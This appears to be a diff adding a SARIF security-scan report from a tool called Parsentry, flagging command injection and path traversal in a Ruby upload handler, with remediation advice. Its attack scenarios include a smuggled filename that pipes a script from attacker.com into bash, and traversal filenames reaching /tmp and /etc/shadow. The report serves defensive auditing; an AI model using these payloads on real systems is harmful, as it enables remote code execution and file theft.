@@ -1,0 +1,184 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Parsentry",
+          "version": "0.13.0",
+          "rules": [
+            {
+              "id": "RCE",
+              "name": "Remote Code Execution via Command Injection",
+              "shortDescription": {
+                "text": "Unsanitized user input used in shell command execution"
+              },
+              "fullDescription": {
+                "text": "User-controlled data from file uploads is directly interpolated into system() calls without proper sanitization or escaping, allowing arbitrary command execution."
+              },
+              "help": {
+                "text": "Remediation:\n1. Use Ruby's Kernel.spawn() or system() with array arguments instead of string interpolation\n2. Validate and sanitize file.original_filename\n3. Use File.basename() to prevent directory traversal\n4. Example: system('cp', full_file_name, backup_path)"
+              },
+              "properties": {
+                "tags": ["command-injection", "shell-injection", "rce"],
+                "kind": "problem"
+              }
+            },
+            {
+              "id": "AFO",
+              "name": "Arbitrary File Operation via Path Traversal",
+              "shortDescription": {
+                "text": "Unsanitized filename allows directory traversal attacks"
+              },
+              "fullDescription": {
+                "text": "The file.original_filename parameter is used directly in file path construction without validation, allowing attackers to write files outside the intended directory."
+              },
+              "help": {
+                "text": "Remediation:\n1. Use File.basename(file.original_filename) to extract only the filename\n2. Implement whitelist validation for allowed filenames\n3. Store uploaded files with generated names\n4. Validate that final path is within expected directory using File.expand_path()"
+              },
+              "properties": {
+                "tags": ["path-traversal", "directory-traversal", "file-operation"],
+                "kind": "problem"
+              }
+            },
+            {
+              "id": "LFI",
+              "name": "Local File Inclusion via Path Traversal",
+              "shortDescription": {
+                "text": "Path traversal allows reading/writing arbitrary files"
+              },
+              "fullDescription": {
+                "text": "The backup operation uses file.original_filename without path normalization, enabling attackers to read or write files outside the public/data directory."
+              },
+              "help": {
+                "text": "Remediation:\n1. Validate that the final expanded path is within the intended directory\n2. Use path canonicalization: File.expand_path(full_file_name).start_with?(File.expand_path(data_path))\n3. Implement strict filename validation\n4. Consider using secure temporary file handling with SecureRandom"
+              },
+              "properties": {
+                "tags": ["path-traversal", "lfi"],
+                "kind": "problem"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "RCE",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Remote Code Execution: Unsanitized filename in system() call allows command injection",
+            "markdown": "## Remote Code Execution via Command Injection\n\n### Vulnerability Details\nLine 15 uses string interpolation with unsanitized `file.original_filename` in a `system()` call:\n\n```ruby\nsystem(\"cp #{full_file_name} #{data_path}/bak#{Time.zone.now.to_i}_#{file.original_filename}\")\n```\n\n### Attack Scenario\nAn attacker can upload a file named:\n```\nindex.txt'; curl http://attacker.com/malware.sh | bash; echo '\n```\n\nThis results in executed command:\n```bash\ncp /path/to/file 'index.txt'; curl http://attacker.com/malware.sh | bash; echo ''\n```\n\n### MITRE ATT&CK\n- T1059: Command and Scripting Interpreter\n- T1204: User Execution"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/app/models/benefits.rb"
+                },
+                "region": {
+                  "startLine": 15,
+                  "snippet": {
+                    "text": "silence_streams(STDERR) { system(\"cp #{full_file_name} #{data_path}/bak#{Time.zone.now.to_i}_#{file.original_filename}\") }"
+                  }
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.95,
+            "cwe": [
+              "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+              "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+            ],
+            "owasp": [
+              "A03:2021 – Injection",
+              "A04:2021 – Insecure Design"
+            ],
+            "mitre_attack": [
+              "T1059.004",
+              "T1204"
+            ]
+          }
+        },
+        {
+          "ruleId": "AFO",
+          "ruleIndex": 1,
+          "level": "error",
+          "message": {
+            "text": "Arbitrary File Operation: Unsanitized filename enables directory traversal and arbitrary file writes",
+            "markdown": "## Arbitrary File Operation via Path Traversal\n\n### Vulnerability Details\nLines 6-9 construct a file path using unsanitized `file.original_filename`:\n\n```ruby\nfull_file_name = \"#{data_path}/#{file.original_filename}\"\nf = File.open(full_file_name, \"wb+\")\nf.write file.read\n```\n\n### Attack Scenario\nAn attacker can upload a file named:\n```\n../../../tmp/pwned.txt\n```\n\nThis allows writing to arbitrary locations outside the intended `public/data` directory.\n\n### Impact\n- Overwrite critical application files\n- Write malicious code to executable paths\n- Compromise application integrity"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/app/models/benefits.rb"
+                },
+                "region": {
+                  "startLine": 6,
+                  "snippet": {
+                    "text": "full_file_name = \"#{data_path}/#{file.original_filename}\""
+                  }
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.95,
+            "cwe": [
+              "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+              "CWE-434: Unrestricted Upload of File with Dangerous Type"
+            ],
+            "owasp": [
+              "A01:2021 – Broken Access Control",
+              "A03:2021 – Injection"
+            ],
+            "mitre_attack": [
+              "T1566.001",
+              "T1190"
+            ]
+          }
+        },
+        {
+          "ruleId": "LFI",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "Local File Inclusion: Path traversal in backup operation exposes files outside intended directory",
+            "markdown": "## Local File Inclusion via Path Traversal\n\n### Vulnerability Details\nThe backup operation in `make_backup()` uses the untrusted filename in path construction without validation:\n\n```ruby\ndef self.make_backup(file, data_path, full_file_name)\n  if File.exist?(full_file_name)\n    silence_streams(STDERR) { system(\"cp #{full_file_name} #{data_path}/bak#{Time.zone.now.to_i}_#{file.original_filename}\") }\n  end\nend\n```\n\n### Attack Scenario\nCombined with the AFO vulnerability, an attacker can:\n1. Upload file with name `../../../etc/shadow` (bypasses path check)\n2. File is copied to backup location with same path traversal\n3. Sensitive files outside public/data become accessible\n\n### Combined Risk\nThis vulnerability is compounded by the earlier AFO and RCE issues, creating a critical security chain."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/app/models/benefits.rb"
+                },
+                "region": {
+                  "startLine": 13,
+                  "snippet": {
+                    "text": "def self.make_backup(file, data_path, full_file_name)"
+                  }
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.85,
+            "cwe": [
+              "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+            ],
+            "owasp": [
+              "A01:2021 – Broken Access Control",
+              "A05:2021 – Security Misconfiguration"
+            ],
+            "mitre_attack": [
+              "T1083"
+            ]
+          }
+        }
+      ]
+    }
+  ]
+}
